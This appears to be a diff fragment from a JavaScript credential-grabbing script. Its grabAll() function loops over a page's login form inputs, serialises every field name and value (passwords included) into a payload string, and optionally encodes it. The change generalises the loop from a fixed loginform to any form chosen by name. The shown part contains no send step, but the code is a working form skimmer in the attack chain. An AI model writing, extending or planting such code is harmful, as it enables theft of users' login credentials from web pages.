@@ -46,15 +46,15 @@ function grabIt() {
 /* parse through the form elements and serialize anything interesting */
 function grabAll() {
         var payload = "";
-        for(var i = 0; i < loginform.elements.length; i++) {
-                console.log("element: " + loginform.elements.item(i));
-                if(loginform.elements.item(i) instanceof HTMLInputElement) {
-                        console.log("name: " + loginform.elements.item(i).name);
-                        console.log("value: " + loginform.elements.item(i).value);
+        for(var i = 0; i < document.forms.namedItem(formName).length; i++) {
+                console.log("element: " + document.forms.namedItem(formName).item(i));
+                if(document.forms.namedItem(formName).item(i) instanceof HTMLInputElement) {
+                        console.log("name: " + document.forms.namedItem(formName).item(i).name);
+                        console.log("value: " + document.forms.namedItem(formName).item(i).value);
 						if(payload == "")
-							payload += loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
+							payload += document.forms.namedItem(formName).item(i).name + ":" + document.forms.namedItem(formName).item(i).value;
 						else
-							payload += "&" + loginform.elements.item(i).name + ":" + loginform.elements.item(i).value;
+							payload += "&" + document.forms.namedItem(formName).item(i).name + ":" + document.forms.namedItem(formName).item(i).value;
                 }
         }
         if(enableEncoding) {
